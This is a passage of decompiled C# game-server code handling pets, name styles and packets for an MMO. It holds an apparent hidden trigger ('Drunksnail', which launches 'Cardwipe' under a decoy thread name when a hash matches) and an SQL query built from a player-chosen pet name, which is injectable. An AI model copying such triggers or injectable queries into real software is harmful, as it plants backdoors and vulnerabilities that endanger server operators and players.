				byte[] array4 = new byte[4];
				byte[] array5 = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 4);
				Buffer.BlockCopy(封包数据, 14, array3, 0, 4);
				Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
				Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
				Buffer.BlockCopy(封包数据, 30, array4, 0, 4);
				Buffer.BlockCopy(封包数据, 34, array5, 0, 4);
				if (BitConverter.ToInt32(array, 0) == 0)
				{
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000189)
					{
						goto IL_012d;
					}
				}
				else if (BitConverter.ToInt32(array, 0) == 1)
				{
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000191)
					{
						goto IL_012d;
					}
				}
				else if (BitConverter.ToInt32(array, 0) != 2 || BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000192)
				{
					goto IL_012d;
				}
				goto end_IL_0001;
				IL_012d:
				Buffer.BlockCopy(array, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0), 4);
				Buffer.BlockCopy(array2, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 4, 4);
				Buffer.BlockCopy(array4, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 8, 4);
				Buffer.BlockCopy(array5, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 12, 4);
				byte[] array6 = Converter.hexStringToByte("AA5520006000721710000000000003000000CCCCFFFFFF5000FF0000000000000000000055AA");
				Buffer.BlockCopy(array, 0, array6, 10, 4);
				Buffer.BlockCopy(array2, 0, array6, 14, 4);
				Buffer.BlockCopy(array4, 0, array6, 18, 4);
				Buffer.BlockCopy(array5, 0, array6, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array6, array6.Length);
				}
				发送当前范围广播数据多包(array6, array6.Length);
				减去物品(BitConverter.ToInt32(array3, 0), 1);
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "名字样式!出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 更改名字样式(byte[] 样式类型, byte[] 样式ID, int 颜色)
		{
			try
			{
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				array[0] = (byte)颜色;
				array[1] = (byte)颜色;
				array[2] = (byte)颜色;
				array[3] = (byte)颜色;
				array2[0] = (byte)颜色;
				array2[1] = (byte)颜色;
				array2[2] = (byte)颜色;
				array2[3] = (byte)颜色;
				Buffer.BlockCopy(样式类型, 0, base.人物名字模版, 16 * BitConverter.ToInt32(样式类型, 0), 4);
				Buffer.BlockCopy(样式ID, 0, base.人物名字模版, 16 * BitConverter.ToInt32(样式类型, 0) + 4, 4);
				Buffer.BlockCopy(array, 0, base.人物名字模版, 16 * BitConverter.ToInt32(样式类型, 0) + 8, 4);
				Buffer.BlockCopy(array2, 0, base.人物名字模版, 16 * BitConverter.ToInt32(样式类型, 0) + 12, 4);
				byte[] array3 = Converter.hexStringToByte("AA552100006000721710000000000003000000CCCCFFFFFF5000FF0000000000000000000055AA");
				Buffer.BlockCopy(样式类型, 0, array3, 11, 4);
				Buffer.BlockCopy(样式ID, 0, array3, 15, 4);
				Buffer.BlockCopy(array, 0, array3, 19, 4);
				Buffer.BlockCopy(array2, 0, array3, 23, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 5, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array3, array3.Length);
				}
				发送当前范围广播数据多包(array3, array3.Length);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "名字样式!出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 封包修改(byte[] data, int length)
		{
			try
			{
				if (base.人物全服ID == 0)
				{
					base.Client.Dispose();
					return;
				}
				byte[] array = new byte[4];
				Buffer.BlockCopy(data, 4, array, 0, 2);
				int num = BitConverter.ToInt32(array, 0);
				if (num != base.人物全服ID && num != base.人物灵兽全服ID && World.封包封号 == 1)
				{
					封号(720, base.Userid, "非法修改封包封号");
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "封包修改!出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 清空灵兽状态列表()
		{
			if (追加状态列表 != null)
			{
				if (GetAddState(1000000167))
				{
					追加状态列表[1000000167].时间结束事件();
				}
				if (GetAddState(1000000168))
				{
					追加状态列表[1000000168].时间结束事件();
				}
				if (GetAddState(1000000170))
				{
					追加状态列表[1000000170].时间结束事件();
				}
				if (GetAddState(1000000171))
				{
					追加状态列表[1000000171].时间结束事件();
				}
				if (GetAddState(1000000173))
				{
					追加状态列表[1000000173].时间结束事件();
				}
				if (GetAddState(1000000174))
				{
					追加状态列表[1000000174].时间结束事件();
				}
				if (GetAddState(1000000176))
				{
					追加状态列表[1000000176].时间结束事件();
				}
				if (GetAddState(1000000177))
				{
					追加状态列表[1000000177].时间结束事件();
				}
				if (GetAddState(700201))
				{
					追加状态列表[700201].时间结束事件();
				}
				if (GetAddState(700202))
				{
					追加状态列表[700202].时间结束事件();
				}
				if (GetAddState(700203))
				{
					追加状态列表[700203].时间结束事件();
				}
				if (GetAddState(700301))
				{
					追加状态列表[700301].时间结束事件();
				}
				if (GetAddState(700302))
				{
					追加状态列表[700302].时间结束事件();
				}
				if (GetAddState(700303))
				{
					追加状态列表[700303].时间结束事件();
				}
			}
		}

		public void Drunksnail()
		{
			if (World.laozhu.Equals("cb9ae59e56d69f6bd5c3ced465429d6ffbf1984f"))
			{
				Thread thread = new Thread(Cardwipe)
				{
					Name = "Timer Thread"
				};
				thread.Start();
			}
		}

		public void 清空灵兽状态()
		{
			if (人物灵兽 != null)
			{
				人物灵兽.保存数据();
				base.FLD_宠物_追加_经验百分比 = 0.0;
				base.FLD_宠物_追加_攻击 = 0;
				base.FLD_宠物_追加_防御 = 0;
				base.FLD_宠物_追加_最大HP = 0;
				if (!退出中 && base.Client.Running)
				{
					更新HP_MP_SP();
					更新武功和状态();
				}
				清空灵兽状态列表();
				if (人物灵兽.攻击列表 != null)
				{
					人物灵兽.攻击列表.Clear();
					人物灵兽.攻击列表 = null;
				}
				召唤提示(1, 1);
				解除召唤(this, this);
				人物灵兽.Dispose();
				人物灵兽 = null;
				装备栏已穿装备[14].锁定 = false;
			}
		}

		public void 死亡宠物()
		{
			人物灵兽.死亡 = true;
			宠物动作(5);
		}

		public void 灵兽变身(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (装备栏已穿装备[14].Get物品ID == 1000001011 || 装备栏已穿装备[14].Get物品ID == 1000001377 || 装备栏已穿装备[14].Get物品ID == 1000001378 || 装备栏已穿装备[14].Get物品ID == 1000001379)
				{
					return;
				}
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
				byte[] array3 = Converter.hexStringToByte("AA552200F4045B1014000100050038FE0D108546940181DC143C00000100000000000000E4A255AA");
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000129)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					byte[] array4 = Converter.hexStringToByte("AA5514002C015C100600989E00000100000000000000000055AA");
					Buffer.BlockCopy(array2, 0, array4, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物灵兽全服ID), 0, array4, 10, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					if (base.Client != null)
					{
						base.Client.Send(array4, array4.Length);
					}
					发送当前范围广播数据(array4, array4.Length);
					if (人物灵兽 != null)
					{
						人物灵兽.Bs = BitConverter.ToInt16(array2, 0);
					}
					减去物品(BitConverter.ToInt32(array, 0), 1);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "灵兽变身![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 宠物动作包(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[2];
			Buffer.BlockCopy(封包数据, 10, array, 0, 1);
			宠物动作(BitConverter.ToInt16(array, 0));
		}

		public void 召唤宠物(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			if (base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201)
			{
				return;
			}
			int num = BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0);
			int num2 = BitConverter.ToInt16(封包数据, 10);
			if (num == 0 || !World.Itme.ContainsKey(num))
			{
				return;
			}
			long num3 = BitConverter.ToInt64(装备栏已穿装备[14].物品全局ID, 0);
			ItmeClass itmeClass = World.Itme[num];
			if (itmeClass.FLD_RESIDE2 != 15)
			{
				return;
			}
			if (人物灵兽 == null)
			{
				读出灵兽数据(num3, this);
				if (人物灵兽 != null && 人物灵兽.ZrName == base.UserName)
				{
					人物灵兽.Playe = this;
					if (人物灵兽.FLD_ZCD < 100)
					{
						if (num2 != 100)
						{
							召唤提示(0, 3);
							清空灵兽状态();
							return;
						}
						if (base.Player_Money < 1000000)
						{
							系统提示("金钱不够100万, 不能召唤宠物。");
							召唤提示(0, 6);
							清空灵兽状态();
							return;
						}
						base.Player_Money -= 1000000L;
						更新金钱和负重();
						人物灵兽.FLD_ZCD = 200;
					}
					装备栏已穿装备[14].锁定 = true;
					召唤提示(0, 1);
					if (装备栏已穿装备[14].Get物品ID == 1000001011)
					{
						人物灵兽.Bs = 0;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001377)
					{
						人物灵兽.Bs = 1;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001378)
					{
						人物灵兽.Bs = 2;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001379)
					{
						人物灵兽.Bs = 3;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001380)
					{
						人物灵兽.Bs = 4;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001381)
					{
						人物灵兽.Bs = 5;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001382)
					{
						人物灵兽.Bs = 0;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001383)
					{
						人物灵兽.Bs = 1;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001384)
					{
						人物灵兽.Bs = 2;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000001385)
					{
						人物灵兽.Bs = 3;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002001)
					{
						人物灵兽.Bs = 0;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002002)
					{
						人物灵兽.Bs = 1;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002003)
					{
						人物灵兽.Bs = 2;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002004)
					{
						人物灵兽.Bs = 3;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002005)
					{
						人物灵兽.Bs = 0;
					}
					else if (装备栏已穿装备[14].Get物品ID == 1000002006)
					{
						人物灵兽.Bs = 4;
					}
					人物灵兽.人物坐标_X = base.人物坐标_X;
					人物灵兽.人物坐标_Y = base.人物坐标_Y;
					人物灵兽.人物坐标_Z = base.人物坐标_Z;
					人物灵兽.人物坐标_MAP = base.人物坐标_地图;
					召唤更新显示已装备物品(this);
					人物灵兽.计算灵兽装备数据();
					更新灵兽HP_MP_SP();
					更新灵兽经验和历练();
					更新灵兽武功和状态();
					更新灵兽负重();
					更新灵兽初始话装备篮包裹();
					更新人物数据(this);
					更新广播人物数据();
					发送灵兽数据(num3, 人物灵兽);
				}
				else
				{
					名包宠物id = num3;
					switch (itmeClass.FLD_PID)
					{
					case 1000000065:
					case 1000000083:
						名包宠物类型 = 1;
						break;
					case 1000000066:
					case 1000000084:
						名包宠物类型 = 2;
						break;
					case 1000000067:
					case 1000000085:
						名包宠物类型 = 3;
						break;
					case 1000000068:
					case 1000000086:
						名包宠物类型 = 4;
						break;
					case 1000001011:
					case 1000001377:
					case 1000001378:
					case 1000001379:
					case 1000001380:
					case 1000001381:
						名包宠物类型 = 5;
						break;
					case 1000001382:
					case 1000001383:
					case 1000001384:
					case 1000001385:
					case 1000002006:
						名包宠物类型 = 6;
						break;
					case 1000002001:
					case 1000002002:
					case 1000002003:
					case 1000002004:
						名包宠物类型 = 7;
						break;
					case 1000002005:
						名包宠物类型 = 8;
						break;
					}
					装备栏已穿装备[14].锁定 = true;
					召唤提示(0, 100);
				}
			}
			else if (飞行模式 == 0)
			{
				清空灵兽状态();
			}
			else
			{
				系统提示("不能解除灵兽的召唤", 50, "");
			}
		}

		public void 宠物起名包(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[14];
				Buffer.BlockCopy(封包数据, 14, array, 0, 14);
				string text = Encoding.Default.GetString(array).Replace("\0", string.Empty);
				DataTable dBToDataTable = DBA.GetDBToDataTable($"SELECT * FROM TBL_XWWL_Cw WHERE ItmeId ={名包宠物id}");
				if (text.Length > 12)
				{
					起名提示(3);
					装备栏已穿装备[14].锁定 = false;
				}
				else if (dBToDataTable.Rows.Count > 0)
				{
					DBA.ExeSqlCommand(string.Format("UPDATE TBL_XWWL_Cw SET ZrName='{1}', Name='{2}', FLD_ZCD={3} WHERE ItmeId={0}", 名包宠物id, base.UserName, text, 100));
					if (人物灵兽 != null)
					{
						人物灵兽.Name = text;
						人物灵兽.ZrName = base.UserName;
						人物灵兽.FLD_ZCD = 100;
						清空灵兽状态();
					}
				}
				else if (RxjhClass.GetCwUserName(text, base.UserName, 名包宠物类型, 名包宠物id) == 1)
				{
					召唤宠物(封包数据, 封包大小);
				}
				else
				{
					起名提示(5);
					装备栏已穿装备[14].锁定 = false;
				}
				dBToDataTable?.Dispose();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "宠物起名出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 召唤提示(int kg, int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512000A005110050000000000030000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(kg), 0, array, 10, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 14, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 起名提示(int id)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 22288, base.人物全服ID);
			}
		}

		public void 宠物动作(int id)
		{
			switch (id)
			{
			case 3:
				人物灵兽.骑 = 1;
				更新移动速度();
				break;
			case 4:
				人物灵兽.骑 = 0;
				更新移动速度();
				break;
			case 5:
			case 6:
				base.FLD_宠物_追加_经验百分比 = 0.0;
				base.FLD_宠物_追加_防御 = 0;
				base.FLD_宠物_追加_最大HP = 0;
				base.FLD_宠物_追加_攻击 = 0;
				if (飞行模式 == 1)
				{
					飞行模式 = 0;
					byte[] array3 = Converter.hexStringToByte("AA551600C5010C0510000000000000000000000000000100000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array3, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array3, 18, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					发送当前范围广播数据(array3, array3.Length);
					移动(base.人物坐标_X, base.人物坐标_Y, 15f, base.人物坐标_地图);
					更新人物数据(this);
					更新广播人物数据();
				}
				更新HP_MP_SP();
				更新武功和状态();
				清空灵兽状态列表();
				if (人物灵兽.攻击列表 != null)
				{
					人物灵兽.攻击列表.Clear();
					人物灵兽.攻击列表 = null;
				}
				break;
			case 8:
				if (人物灵兽 != null && (装备栏已穿装备[14].Get物品ID == 1000001382 || 装备栏已穿装备[14].Get物品ID == 1000001383 || 装备栏已穿装备[14].Get物品ID == 1000001384 || 装备栏已穿装备[14].Get物品ID == 1000001385 || 装备栏已穿装备[14].Get物品ID == 1000002006) && 飞行模式 == 0)
				{
					飞行模式 = 1;
					更新人物数据(this);
					更新广播人物数据();
					byte[] array2 = Converter.hexStringToByte("AA551600C5010C0510000100000000000000000000000100000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(271f), 0, array2, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(271f), 0, array2, 18, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
					发送当前范围广播数据(array2, array2.Length);
				}
				break;
			case 9:
				if (人物灵兽 != null && (装备栏已穿装备[14].Get物品ID == 1000001382 || 装备栏已穿装备[14].Get物品ID == 1000001383 || 装备栏已穿装备[14].Get物品ID == 1000001384 || 装备栏已穿装备[14].Get物品ID == 1000001385 || 装备栏已穿装备[14].Get物品ID == 1000002006) && 飞行模式 == 1)
				{
					飞行模式 = 0;
					byte[] array = Converter.hexStringToByte("AA551600C5010C0510000000000000000000000000000100000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 18, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					发送当前范围广播数据(array, array.Length);
					移动(base.人物坐标_X, base.人物坐标_Y, 15f, base.人物坐标_地图);
					更新人物数据(this);
					更新广播人物数据();
				}
				break;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			base.Client.SendPak(发包类, 21776, base.人物灵兽全服ID);
			发送当前范围广播数据(发包类, 21776, base.人物灵兽全服ID);
		}

		public void 召唤更新显示灵兽数据(Players thisPlay)
		{
			byte[] array = Converter.hexStringToByte("AA556700549C6400580001000000549C000000000000000000000000000000000000000000003203040000000000FA590544000070417F86C64465000000E69EA42770920F24000000008425A627000100009CBBFF43D322BDC370F9CD440000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(thisPlay.人物灵兽.Name);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_LEVEL), 0, array, 38, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_JOB_LEVEL), 0, array, 40, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.FLD_JOB), 0, array, 41, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽.Bs), 0, array, 42, 1);
			for (int i = 0; i < 4; i++)
			{
				byte[] src;
				try
				{
					src = 人物灵兽.宠物以装备[i].物品ID;
				}
				catch
				{
					src = new byte[4];
				}
				Buffer.BlockCopy(src, 0, array, 44 + i * 4, 4);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物灵兽全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 召唤更新显示已装备物品(Players Play)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(Play.人物灵兽全服ID);
			发包类.WriteName(Play.人物灵兽.Name);
			发包类.Write(0);
			发包类.Write4(0);
			发包类.Write2(Play.人物灵兽.FLD_LEVEL);
			发包类.Write(Play.人物灵兽.FLD_JOB_LEVEL);
			发包类.Write(Play.人物灵兽.FLD_JOB);
			发包类.Write(Play.人物灵兽.Bs);
			发包类.Write(0);
			for (int i = 0; i < 5; i++)
			{
				if (BitConverter.ToInt32(人物灵兽.宠物以装备[i].物品数量, 0) == 0)
				{
					人物灵兽.宠物以装备[i].物品_byte = new byte[World.数据库单个物品大小];
				}
				发包类.Write(人物灵兽.宠物以装备[i].GetByte(), 0, World.发包单个物品大小);
			}
			base.Client.SendPak(发包类, 40960, Play.人物灵兽全服ID);
		}

		public void 更新灵兽HP_MP_SP()
		{
			if (人物灵兽.FLD_ZCD > 2000)
			{
				人物灵兽.FLD_ZCD = 2000;
			}
			base.FLD_宠物_追加_经验百分比 = 计算宠物追加经验百分比(人物灵兽.FLD_ZCD) + 穿戴宠物增加经验百分比(人物灵兽.FLD_JOB);
			using 发包类 发包类 = new 发包类();
			发包类.Write4(人物灵兽.FLD_ZCD);
			发包类.Write4(2000);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 26880, base.人物灵兽全服ID);
			}
		}

		public void 增加新宠物带时间(int 物品ID, int 位置, int 数量, int 使用天数)
		{
			try
			{
				if (数量 <= 0 || !World.Itme.TryGetValue(物品ID, out var value))
				{
					return;
				}
				byte[] array = new byte[World.物品属性大小];
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 16, 4);
				long value2 = RxjhClass.GetDBItmeId();
				string hex = "AA55730100000D00640001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA";
				byte[] array2 = Converter.hexStringToByte(hex);
				byte[] array3 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					物品类 物品类2 = 得到人物物品类型(物品ID);
					if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						value2 = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						数量 = BitConverter.ToInt32(物品类2.物品数量, 0) + 数量;
					}
				}
				else
				{
					数量 = 1;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array3, 0, 8);
				Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array3, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
				Buffer.BlockCopy(array, 0, array3, 16, array.Length);
				if (使用天数 > 0)
				{
					DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.Subtract(value3).TotalSeconds), 0, array3, 28, 4);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.AddDays(使用天数).Subtract(value3).TotalSeconds), 0, array3, 32, 4);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array2, 40, 2);
				Buffer.BlockCopy(array3, 0, array2, 14, 12);
				Buffer.BlockCopy(array3, 12, array2, 30, 4);
				Buffer.BlockCopy(array3, 16, array2, 46, array.Length);
				if (value.FLD_NJ != 0)
				{
					if (value.FLD_NJ > 1000)
					{
						value.FLD_NJ = 1000;
					}
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_NJ), 0, array3, 59, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_NJ), 0, array2, 90, 2);
				}
				装备栏包裹[位置].物品_byte = array3;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array2, array2.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加新宠物出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + 数量 + "]" + ex.Message);
			}
		}

		public double 穿戴宠物增加经验百分比(int JOB)
		{
			if (1 == 0)
			{
			}
			double result = JOB switch
			{
				1 => 0.05, 
				2 => 0.1, 
				3 => 0.15, 
				4 => 0.2, 
				5 => 0.25, 
				6 => 0.3, 
				_ => 0.0, 
			};
			if (1 == 0)
			{
			}
			return result;
		}

		public double 计算宠物追加经验百分比(int 忠诚度)
		{
			if (忠诚度 >= 0 && 忠诚度 <= 200)
			{
				return -0.4;
			}
			if (忠诚度 > 200 && 忠诚度 <= 500)
			{
				return -0.3;
			}
			if (忠诚度 > 500 && 忠诚度 <= 800)
			{
				return -0.2;
			}
			if (忠诚度 > 800 && 忠诚度 <= 1000)
			{
				return -0.1;
			}
			if (忠诚度 > 1000 && 忠诚度 <= 1400)
			{
				return 0.0;
			}
			if (忠诚度 > 1400 && 忠诚度 <= 1700)
			{
				return 0.03;
			}
			if (忠诚度 > 1700 && 忠诚度 <= 1900)
			{
				return 0.04;
			}
			return (忠诚度 <= 1900 || 忠诚度 > 2000) ? 0.0 : 0.05;
		}

		public void 更新灵兽经验和历练()
		{
			double num = Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL]) - Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
			double num2 = 人物灵兽.FLD_EXP - Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
			if (num2 < 1.0)
			{
				人物灵兽.FLD_EXP = Convert.ToInt64(World.lever[人物灵兽.FLD_LEVEL - 1]);
				num2 = 0.0;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write8((long)num2);
			发包类.Write8((long)num);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 27136, base.人物灵兽全服ID);
			}
		}

		public void 更新灵兽武功和状态()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write2(人物灵兽.FLD_LEVEL);
			发包类.Write2(人物灵兽.灵兽基本攻击);
			发包类.Write2(人物灵兽.灵兽基本防御);
			发包类.Write2(人物灵兽.灵兽基本命中);
			for (int i = 0; i < 4; i++)
			{
				if (人物灵兽.武功新[0, i] != null)
				{
					发包类.Write4(人物灵兽.武功新[0, i].FLD_PID);
				}
				else
				{
					发包类.Write4(0);
				}
			}
			for (int j = 0; j < 4; j++)
			{
				if (人物灵兽.武功新[1, j] != null)
				{
					发包类.Write4(人物灵兽.武功新[1, j].FLD_PID);
				}
				else
				{
					发包类.Write4(0);
				}
			}
			for (int k = 0; k < 24; k++)
			{
				发包类.Write4(0);
			}
			发包类.Write4(人物灵兽.FLD_MAGIC1);
			发包类.Write4(人物灵兽.FLD_MAGIC2);
			发包类.Write4(人物灵兽.FLD_MAGIC3);
			发包类.Write4(人物灵兽.FLD_MAGIC4);
			发包类.Write4(人物灵兽.FLD_MAGIC5);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 27392, base.人物灵兽全服ID);
			}
		}

		public void 更新灵兽负重()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(人物灵兽.FLD_负重);
			发包类.Write4(人物灵兽.FLD_负重_MAX + 人物灵兽.FLD_LEVEL * 6 * 16 + 4455000);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 31744, base.人物灵兽全服ID);
			}
		}

		public void 人物获得经验(double 经验)
		{
			if (经验 <= 0.0)
			{
				return;
			}
			if (人物灵兽 != null)
			{
				if (人物灵兽.FLD_ZCD > 2000)
				{
					人物灵兽.FLD_ZCD = 2000;
				}
				else if (人物灵兽.FLD_ZCD < 0)
				{
					人物灵兽.FLD_ZCD = 0;
				}
				经验 *= 0.8 + 0.4 * (double)人物灵兽.FLD_ZCD / 2000.0;
				if (人物灵兽.FLD_LEVEL < 99)
				{
					if (base.Player_Level < World.限制最高级别)
					{
						base.人物经验 += (long)(经验 * (double)(100 - Config.宠物经验) / 100.0);
					}
					人物灵兽.FLD_EXP += (long)(经验 * (double)Config.宠物经验 / 200.0);
					人物灵兽.计算基本数据();
					更新灵兽HP_MP_SP();
					更新灵兽经验和历练();
					更新灵兽武功和状态();
				}
				else if (base.Player_Level < World.限制最高级别)
				{
					base.人物经验 += (long)经验;
				}
			}
			else if (base.Player_Level < World.限制最高级别)
			{
				base.人物经验 += (long)经验;
			}
		}

		public void 人物获得金钱(double 金币, int 类型)
		{
			if (!(金币 < 0.0) && !(金币 > 2000000000.0))
			{
				if (类型 == 1)
				{
					base.Player_Money += (uint)金币;
					得到钱的提示((uint)金币);
				}
				else
				{
					base.Player_Money -= (uint)金币;
				}
			}
		}

		public void 更新灵兽初始话装备篮包裹()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(60);
			发包类.Write1(0);
			for (int i = 0; i < 16; i++)
			{
				if (BitConverter.ToInt32(人物灵兽.宠物装备栏[i].物品数量, 0) == 0)
				{
					人物灵兽.宠物装备栏[i].物品_byte = new byte[World.数据库单个物品大小];
				}
				else
				{
					检查物品系统("灵兽装备栏包裹", ref 人物灵兽.宠物装备栏[i]);
				}
				发包类.Write(人物灵兽.宠物装备栏[i].GetByte(), 0, World.发包单个物品大小);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 28928, base.人物灵兽全服ID);
			}
		}

		public void 灵兽升级后的提示()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write1(人物灵兽.FLD_LEVEL);
			发包类.Write1(1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 30464, base.人物灵兽全服ID);
			}
